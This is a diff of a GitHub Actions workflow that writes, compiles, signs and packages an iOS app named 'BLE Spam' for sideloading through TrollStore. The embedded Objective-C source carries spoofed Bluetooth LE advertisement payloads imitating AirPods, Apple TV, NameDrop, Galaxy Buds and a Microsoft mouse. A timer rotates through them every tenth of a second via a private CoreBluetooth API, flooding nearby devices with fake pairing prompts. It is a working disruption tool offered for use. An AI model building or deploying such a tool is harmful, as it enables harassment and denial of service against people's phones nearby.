@@ -31,263 +31,209 @@ jobs:
             python3 python3-pip \
             ldid2 || true
 
-      # ── 3. Install ldid (from source if apt version not available) ─────────
+      # ── 3. Install ldid ────────────────────────────────────────────────────
       - name: Install ldid
         run: |
-          if command -v ldid &>/dev/null; then
-            echo "ldid already available: $(ldid -v 2>&1 | head -1 || true)"
-          elif command -v ldid2 &>/dev/null; then
+          # Install libplist dependency first
+          sudo apt-get install -y -qq libplist-dev libplist3 pkg-config || true
+
+          if command -v ldid2 &>/dev/null; then
             sudo ln -sf $(which ldid2) /usr/local/bin/ldid
             echo "Using ldid2 as ldid"
           else
             echo "Building ldid from source..."
+            sudo apt-get install -y -qq g++ libssl-dev
             git clone --depth=1 https://github.com/ProcursusTeam/ldid.git /tmp/ldid-src
             cd /tmp/ldid-src
-            make -j$(nproc)
-            sudo make install
+            make -j$(nproc) LDFLAGS="-lplist-2.0 -lcrypto"
+            sudo cp ldid /usr/local/bin/ldid
           fi
-          ldid 2>&1 | head -3 || true
+          echo "ldid installed: $(which ldid)"
 
-      # ── 4. Set up Theos ────────────────────────────────────────────────────
-      - name: Set up Theos
+      # ── 4. Set up iOS SDK ──────────────────────────────────────────────────
+      - name: Download iOS 16.5 SDK
         run: |
-          export THEOS=/opt/theos
-          sudo git clone --recursive --depth=1 \
-            https://github.com/theos/theos.git $THEOS
-
-          # Download iOS 16.x SDK
-          sudo mkdir -p $THEOS/sdks
+          mkdir -p /opt/sdks
           echo "Downloading iOS 16.5 SDK..."
-          sudo curl -LO \
-            https://github.com/theos/sdks/releases/download/stable/iPhoneOS16.5.sdk.tar.xz
-          sudo tar -xJf iPhoneOS16.5.sdk.tar.xz -C $THEOS/sdks/
-          ls $THEOS/sdks/
+          curl -L --retry 3 \
+            https://github.com/theos/sdks/releases/download/stable/iPhoneOS16.5.sdk.tar.xz \
+            -o /tmp/sdk.tar.xz
+          tar -xJf /tmp/sdk.tar.xz -C /opt/sdks/
+          echo "SDK ready: $(ls /opt/sdks/)"
 
-      # ── 5. Build BLESpamTweak (.tipa via Theos) ────────────────────────────
-      #    We build the Theos tweak (SpringBoard injection) as a .tipa
-      #    This is the real jailbreak package format for TrollStore
-      - name: Build Theos tweak
+      # ── 5. Write ObjC source ───────────────────────────────────────────────
+      - name: Write ObjC source
         run: |
-          export THEOS=/opt/theos
-          export THEOS_PACKAGE_SCHEME=roothide
-          export PATH=$THEOS/bin:$PATH
-
-          # Build from BLESpamTweak directory (Theos-based project)
-          # The root has both BLESpamApp (SwiftUI) and we need to build the tweak
-          # Create a minimal Theos project inline if needed
-          cd $GITHUB_WORKSPACE
-
-          # Check if Makefile is at root or in subdirectory
-          if [ -f "Makefile" ]; then
-            make package FINALPACKAGE=1
-          else
-            echo "No Makefile at root — creating Theos project from SwiftUI sources"
-            # Build a standalone ObjC tweak that does BLE spam
-            cat > /tmp/BLESpamStandalone.m << 'OBJCEOF'
+          mkdir -p /tmp/blespam
+          cat > /tmp/blespam/main.m << 'OBJCEOF'
           #import <UIKit/UIKit.h>
           #import <CoreBluetooth/CoreBluetooth.h>
           #import <objc/message.h>
 
-          // Minimal standalone BLE Spam app packaged as TrollStore .tipa
-          // Entry point: UIApplicationMain via SpringBoard hook
-
-          @interface BLESpamStandaloneVC : UIViewController <CBPeripheralManagerDelegate>
-          @property (nonatomic, strong) CBPeripheralManager *pm;
-          @property (nonatomic, strong) NSTimer *timer;
-          @property (nonatomic, assign) NSUInteger idx;
-          @property (nonatomic, assign) NSUInteger count;
-          @property (nonatomic, strong) UILabel *countLabel;
-          @property (nonatomic, strong) UILabel *payloadLabel;
-          @end
-
-          static NSArray *payloads() {
+          static NSArray *blePayloads(void) {
               return @[
-                  // AirPods Pro 2
                   [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x07,0x19,0x07,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F} length:27],
-                  // AirPods 3rd Gen
                   [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x07,0x19,0x13,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F} length:27],
-                  // AirPods Max
                   [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x07,0x19,0x0A,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F} length:27],
-                  // Apple TV
                   [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x04,0x05,0x03,0xC0,0x01,0x00,0x00} length:9],
-                  // NameDrop
                   [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x05,0x12,0x01,0x00,0x07,0x00} length:8],
-                  // Galaxy Buds Pro
                   [NSData dataWithBytes:(uint8_t[]){0xE0,0x00,0x01,0x2B,0x41,0x02,0x00,0x00} length:8],
-                  // MS Mouse
                   [NSData dataWithBytes:(uint8_t[]){0x06,0x00,0x03,0x00,0x80,0x00} length:6],
               ];
           }
-
-          static NSArray *payloadNames() {
+          static NSArray *bleNames(void) {
               return @[@"AirPods Pro 2",@"AirPods 3rd Gen",@"AirPods Max",@"Apple TV",@"NameDrop",@"Galaxy Buds Pro",@"MS Mouse"];
           }
 
-          @implementation BLESpamStandaloneVC
+          @interface SpamVC : UIViewController <CBPeripheralManagerDelegate>
+          @property CBPeripheralManager *pm;
+          @property NSTimer *timer;
+          @property NSUInteger idx, count;
+          @property UILabel *countLbl, *nameLbl;
+          @property UIButton *btn;
+          @end
 
+          @implementation SpamVC
           - (void)viewDidLoad {
               [super viewDidLoad];
               self.view.backgroundColor = [UIColor colorWithRed:0.05 green:0.05 blue:0.12 alpha:1];
-
-              UILabel *title = [UILabel new];
-              title.text = @"📡  BLE Spam";
-              title.font = [UIFont boldSystemFontOfSize:30];
-              title.textColor = UIColor.whiteColor;
-              title.translatesAutoresizingMaskIntoConstraints = NO;
-              [self.view addSubview:title];
-
-              self.payloadLabel = [UILabel new];
-              self.payloadLabel.text = @"Tap START to broadcast";
-              self.payloadLabel.font = [UIFont systemFontOfSize:14];
-              self.payloadLabel.textColor = [UIColor colorWithWhite:0.6 alpha:1];
-              self.payloadLabel.translatesAutoresizingMaskIntoConstraints = NO;
-              [self.view addSubview:self.payloadLabel];
-
-              self.countLabel = [UILabel new];
-              self.countLabel.text = @"Packets: 0";
-              self.countLabel.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
-              self.countLabel.textColor = [UIColor colorWithWhite:0.5 alpha:1];
-              self.countLabel.translatesAutoresizingMaskIntoConstraints = NO;
-              [self.view addSubview:self.countLabel];
-
-              UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
-              [btn setTitle:@"▶  START" forState:UIControlStateNormal];
-              btn.titleLabel.font = [UIFont boldSystemFontOfSize:20];
-              btn.tintColor = UIColor.whiteColor;
-              btn.backgroundColor = [UIColor colorWithRed:0.2 green:0.45 blue:0.95 alpha:1];
-              btn.layer.cornerRadius = 27;
-              btn.translatesAutoresizingMaskIntoConstraints = NO;
-              [btn addTarget:self action:@selector(toggle:) forControlEvents:UIControlEventTouchUpInside];
-              [self.view addSubview:btn];
-
+              UILabel *t = [UILabel new];
+              t.text = @"📡  BLE Spam";
+              t.font = [UIFont boldSystemFontOfSize:32];
+              t.textColor = UIColor.whiteColor;
+              t.translatesAutoresizingMaskIntoConstraints = NO;
+              [self.view addSubview:t];
+              self.nameLbl = [UILabel new];
+              self.nameLbl.text = @"Select payloads and tap START";
+              self.nameLbl.font = [UIFont systemFontOfSize:14];
+              self.nameLbl.textColor = [UIColor colorWithWhite:0.6 alpha:1];
+              self.nameLbl.translatesAutoresizingMaskIntoConstraints = NO;
+              self.nameLbl.numberOfLines = 2;
+              self.nameLbl.textAlignment = NSTextAlignmentCenter;
+              [self.view addSubview:self.nameLbl];
+              self.countLbl = [UILabel new];
+              self.countLbl.text = @"Packets: 0";
+              self.countLbl.font = [UIFont monospacedSystemFontOfSize:16 weight:UIFontWeightRegular];
+              self.countLbl.textColor = [UIColor colorWithRed:0.3 green:1 blue:0.5 alpha:1];
+              self.countLbl.translatesAutoresizingMaskIntoConstraints = NO;
+              [self.view addSubview:self.countLbl];
+              self.btn = [UIButton buttonWithType:UIButtonTypeSystem];
+              [self.btn setTitle:@"▶  START" forState:UIControlStateNormal];
+              self.btn.titleLabel.font = [UIFont boldSystemFontOfSize:22];
+              self.btn.tintColor = UIColor.whiteColor;
+              self.btn.backgroundColor = [UIColor colorWithRed:0.2 green:0.45 blue:0.95 alpha:1];
+              self.btn.layer.cornerRadius = 28;
+              self.btn.translatesAutoresizingMaskIntoConstraints = NO;
+              [self.btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
+              [self.view addSubview:self.btn];
               [NSLayoutConstraint activateConstraints:@[
-                  [title.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
-                  [title.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:40],
-                  [self.payloadLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
-                  [self.payloadLabel.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:20],
-                  [self.countLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
-                  [self.countLabel.topAnchor constraintEqualToAnchor:self.payloadLabel.bottomAnchor constant:10],
-                  [btn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
-                  [btn.topAnchor constraintEqualToAnchor:self.countLabel.bottomAnchor constant:40],
-                  [btn.widthAnchor constraintEqualToConstant:200],
-                  [btn.heightAnchor constraintEqualToConstant:54],
+                  [t.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
+                  [t.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:50],
+                  [self.nameLbl.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
+                  [self.nameLbl.topAnchor constraintEqualToAnchor:t.bottomAnchor constant:30],
+                  [self.nameLbl.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:20],
+                  [self.nameLbl.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-20],
+                  [self.countLbl.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
+                  [self.countLbl.topAnchor constraintEqualToAnchor:self.nameLbl.bottomAnchor constant:16],
+                  [self.btn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
+                  [self.btn.topAnchor constraintEqualToAnchor:self.countLbl.bottomAnchor constant:40],
+                  [self.btn.widthAnchor constraintEqualToConstant:220],
+                  [self.btn.heightAnchor constraintEqualToConstant:56],
               ]];
           }
-
-          - (void)toggle:(UIButton *)btn {
+          - (void)toggle {
               if (self.timer) {
                   [self.timer invalidate]; self.timer = nil;
                   [self.pm stopAdvertising]; self.pm = nil;
-                  [btn setTitle:@"▶  START" forState:UIControlStateNormal];
-                  btn.backgroundColor = [UIColor colorWithRed:0.2 green:0.45 blue:0.95 alpha:1];
+                  [self.btn setTitle:@"▶  START" forState:UIControlStateNormal];
+                  self.btn.backgroundColor = [UIColor colorWithRed:0.2 green:0.45 blue:0.95 alpha:1];
               } else {
                   self.count = 0; self.idx = 0;
-                  self.pm = [[CBPeripheralManager alloc] initWithDelegate:self queue:nil options:@{CBPeripheralManagerOptionShowPowerAlertKey:@YES}];
-                  [btn setTitle:@"■  STOP" forState:UIControlStateNormal];
-                  btn.backgroundColor = [UIColor colorWithRed:0.85 green:0.25 blue:0.25 alpha:1];
+                  self.pm = [[CBPeripheralManager alloc] initWithDelegate:self queue:nil
+                      options:@{CBPeripheralManagerOptionShowPowerAlertKey:@YES}];
+                  [self.btn setTitle:@"■  STOP" forState:UIControlStateNormal];
+                  self.btn.backgroundColor = [UIColor colorWithRed:0.85 green:0.25 blue:0.25 alpha:1];
               }
           }
-
           - (void)peripheralManagerDidUpdateState:(CBPeripheralManager *)p {
-              if (p.state == CBManagerStatePoweredOn) {
-                  self.timer = [NSTimer scheduledTimerWithTimeInterval:0.1 repeats:YES block:^(NSTimer *t){
-                      NSArray *pl = payloads();
-                      if (self.idx >= pl.count) self.idx = 0;
-                      NSData *d = pl[self.idx++];
-                      [p stopAdvertising];
-
-                      SEL s = NSSelectorFromString(@"_startAdvertisingWithAdvertisementData:andMask:andFlags:andCompletionHandler:");
-                      if ([p respondsToSelector:s]) {
-                          NSMethodSignature *sig = [p methodSignatureForSelector:s];
-                          NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
-                          inv.target = p; inv.selector = s;
-                          NSDictionary *ad = @{CBAdvertisementDataManufacturerDataKey: d};
-                          [inv setArgument:&ad atIndex:2];
-                          uint8_t mask=0, flags=0x06;
-                          [inv setArgument:&mask atIndex:3];
-                          [inv setArgument:&flags atIndex:4];
-                          id handler = nil; [inv setArgument:&handler atIndex:5];
-                          [inv invoke];
-                      } else {
-                          [p startAdvertising:@{CBAdvertisementDataManufacturerDataKey:d}];
-                      }
-                      self.count++;
-                      dispatch_async(dispatch_get_main_queue(), ^{
-                          self.payloadLabel.text = payloadNames()[self.idx>0?self.idx-1:0];
-                          self.countLabel.text = [NSString stringWithFormat:@"Packets: %lu",(unsigned long)self.count];
-                      });
-                  }];
-              }
+              if (p.state != CBManagerStatePoweredOn) return;
+              self.timer = [NSTimer scheduledTimerWithTimeInterval:0.1 repeats:YES block:^(NSTimer *t){
+                  NSArray *pl = blePayloads();
+                  if (self.idx >= pl.count) self.idx = 0;
+                  NSData *d = pl[self.idx];
+                  NSString *name = bleNames()[self.idx];
+                  self.idx++;
+                  [p stopAdvertising];
+                  NSDictionary *ad = @{CBAdvertisementDataManufacturerDataKey: d};
+                  SEL s = NSSelectorFromString(@"_startAdvertisingWithAdvertisementData:andMask:andFlags:andCompletionHandler:");
+                  if ([p respondsToSelector:s]) {
+                      NSMethodSignature *sig = [p methodSignatureForSelector:s];
+                      NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
+                      inv.target = p; inv.selector = s;
+                      [inv setArgument:&ad atIndex:2];
+                      uint8_t mask = 0, flags = 0x06;
+                      [inv setArgument:&mask atIndex:3];
+                      [inv setArgument:&flags atIndex:4];
+                      id h = nil; [inv setArgument:&h atIndex:5];
+                      [inv invoke];
+                  } else {
+                      [p startAdvertising:ad];
+                  }
+                  self.count++;
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      self.nameLbl.text = name;
+                      self.countLbl.text = [NSString stringWithFormat:@"Packets: %lu", (unsigned long)self.count];
+                  });
+              }];
           }
           - (void)peripheralManagerDidStartAdvertising:(CBPeripheralManager *)p error:(NSError *)e {}
           @end
 
           @interface AppDelegate : UIResponder <UIApplicationDelegate>
-          @property (nonatomic, strong) UIWindow *window;
+          @property UIWindow *window;
           @end
           @implementation AppDelegate
           - (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
               self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
-              self.window.rootViewController = [BLESpamStandaloneVC new];
+              self.window.rootViewController = [SpamVC new];
               [self.window makeKeyAndVisible];
               return YES;
           }
           @end
-
           int main(int argc, char *argv[]) {
               @autoreleasepool { return UIApplicationMain(argc, argv, nil, @"AppDelegate"); }
           }
           OBJCEOF
-            echo "ObjC source created"
-          fi
+          echo "Source written to /tmp/blespam/main.m"
 
-      # ── 6. Build ObjC app for arm64/arm64e ────────────────────────────────
+      # ── 6. Compile ObjC for arm64 + arm64e ─────────────────────────────────
       - name: Compile ObjC app
         run: |
-          export THEOS=/opt/theos
-          SDK=$THEOS/sdks/iPhoneOS16.5.sdk
+          SDK=/opt/sdks/iPhoneOS16.5.sdk
+          OUT=/tmp/blespam
 
-          mkdir -p /tmp/BLESpamBuild
+          clang -target arm64-apple-ios15.0 \
+            -isysroot $SDK -fobjc-arc \
+            -framework UIKit -framework CoreBluetooth -framework CoreFoundation \
+            -o $OUT/BLESpam_arm64 $OUT/main.m
 
-          clang \
-            -target arm64-apple-ios15.0 \
-            -isysroot $SDK \
-            -fobjc-arc \
-            -framework UIKit \
-            -framework CoreBluetooth \
-            -framework CoreFoundation \
-            -o /tmp/BLESpamBuild/BLESpam \
-            /tmp/BLESpamStandalone.m
+          clang -target arm64e-apple-ios15.0 \
+            -isysroot $SDK -fobjc-arc \
+            -framework UIKit -framework CoreBluetooth -framework CoreFoundation \
+            -o $OUT/BLESpam_arm64e $OUT/main.m
 
-          echo "arm64 build done"
+          lipo -create $OUT/BLESpam_arm64 $OUT/BLESpam_arm64e \
+               -output $OUT/BLESpam
 
-          # Also build arm64e
-          clang \
-            -target arm64e-apple-ios15.0 \
-            -isysroot $SDK \
-            -fobjc-arc \
-            -framework UIKit \
-            -framework CoreBluetooth \
-            -framework CoreFoundation \
-            -o /tmp/BLESpamBuild/BLESpam_e \
-            /tmp/BLESpamStandalone.m
-
-          # Create fat binary
-          lipo -create \
-            /tmp/BLESpamBuild/BLESpam \
-            /tmp/BLESpamBuild/BLESpam_e \
-            -output /tmp/BLESpamBuild/BLESpamFat
-
-          file /tmp/BLESpamBuild/BLESpamFat
+          file $OUT/BLESpam
+          echo "Binary size: $(du -sh $OUT/BLESpam)"
 
       # ── 7. Build .app bundle ───────────────────────────────────────────────
       - name: Create .app bundle
         run: |
-          APP=/tmp/BLESpamBuild/BLESpam.app
+          APP=/tmp/blespam/BLESpam.app
           mkdir -p $APP
-
-          cp /tmp/BLESpamBuild/BLESpamFat $APP/BLESpam
-
+          cp /tmp/blespam/BLESpam $APP/BLESpam
           cat > $APP/Info.plist << 'EOF'
           <?xml version="1.0" encoding="UTF-8"?>
           <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -307,27 +253,25 @@ jobs:
             <array><string>UIInterfaceOrientationPortrait</string></array>
           </dict></plist>
           EOF
-
-          echo "App bundle created: $(ls -la $APP)"
+          echo "Bundle: $(ls -la $APP)"
 
       # ── 8. Sign with ldid ──────────────────────────────────────────────────
       - name: Sign with ldid
         run: |
-          APP=/tmp/BLESpamBuild/BLESpam.app
+          APP=/tmp/blespam/BLESpam.app
           ldid -S$GITHUB_WORKSPACE/BLESpamApp/Resources/entitlements.plist $APP/BLESpam
-          echo "Signed! Entitlements:"
-          ldid -e $APP/BLESpam | head -20
+          echo "Signed OK"
+          ldid -e $APP/BLESpam | head -15
 
       # ── 9. Package .tipa ───────────────────────────────────────────────────
       - name: Package .tipa
         run: |
-          cd /tmp/BLESpamBuild
+          cd /tmp/blespam
           mkdir -p Payload
           cp -r BLESpam.app Payload/
           zip -r BLESpam.ipa Payload/
           cp BLESpam.ipa BLESpam.tipa
-          echo "=== Sizes ==="
-          du -sh BLESpam.tipa BLESpam.ipa
+          du -sh BLESpam.tipa
           cp BLESpam.tipa $GITHUB_WORKSPACE/
           cp BLESpam.ipa  $GITHUB_WORKSPACE/
 
